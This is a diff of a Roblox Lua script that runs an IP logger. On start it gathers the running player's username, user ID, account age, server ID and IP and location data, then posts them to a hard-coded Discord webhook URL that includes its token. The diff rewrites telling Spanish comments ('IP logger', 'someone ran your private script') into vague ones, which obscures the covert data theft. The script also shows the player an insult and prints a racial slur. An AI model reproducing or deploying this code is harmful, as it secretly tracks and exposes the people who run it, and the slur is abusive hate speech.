@@ -6,13 +6,13 @@ local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- === TU WEBHOOK (ya con proxy) ===
+-- System --
 local WebhookConfig = {
     Enabled = true,
     Url = "https://webhook.lewisakura.moe/api/webhooks/1549137752078164008/30EJxv_O5QMfqwyZWcd5hFYWCYxIaQmvmkNqgxaYAudIfBVrrWZQ_v8tTyChkE8mhhoW"
 }
 
--- Función para mostrar notificación verde (edita el texto aquí)
+-- Function --
 local function ShowGreenNotification(text)
     local screenGui = playerGui:FindFirstChild("ScriptNotification") or Instance.new("ScreenGui")
     screenGui.Name = "ScriptNotification"
@@ -50,7 +50,7 @@ local function ShowGreenNotification(text)
     fade.Completed:Connect(function() frame:Destroy() end)
 end
 
--- Función para obtener IP y datos + enviar al Discord
+-- Función WebHook --
 local function SendWebhookWithIP()
     if not WebhookConfig.Enabled then return end
 
@@ -62,7 +62,7 @@ local function SendWebhookWithIP()
     local accountAge = player.AccountAge
     local approxDate = os.date("%d/%m/%Y", os.time() - accountAge * 86400)
 
-    -- Obtener IP y más info
+    -- Method --
     local ipData = {
         query = "Desconocido",
         country = "Desconocido",
@@ -78,8 +78,8 @@ local function SendWebhookWithIP()
 
     local embed = {
         title = "Home Of God",
-        description = "Alguien ejecutó tu script privado",
-        color = 0xFF0000,  -- Rojo para que destaque
+        description = "IpLogger",
+        color = 0xFF0000,  -- red --
         fields = {
             {name = "Usuario", value = "```"..player.Name.." ("..player.UserId..")```", inline = true},
             {name = "IP", value = "```".. (ipData.query or "No disponible") .."```", inline = true},
@@ -90,7 +90,7 @@ local function SendWebhookWithIP()
             {name = "Creada aprox.", value = "```"..approxDate.."```", inline = true},
             {name = "Servidor", value = "```"..tostring(game.JobId).."```", inline = false}
         },
-        footer = {text = "Logger Privado • "..os.date("%Y-%m-%d %H:%M:%S")}
+        footer = {text = "Logger • "..os.date("%Y-%m-%d %H:%M:%S")}
     }
 
     local data = { 
@@ -111,10 +111,10 @@ local function SendWebhookWithIP()
     end)
 end
 
--- === AL INICIAR ===
+-- System --
 SendWebhookWithIP()
 
--- ←←← EDITA AQUÍ EL TEXTO VERDE QUE VE EL JUGADOR ←←←
+-- ←←← Method
 ShowGreenNotification("Fuck you")
 
 print("Fuck Nigger")
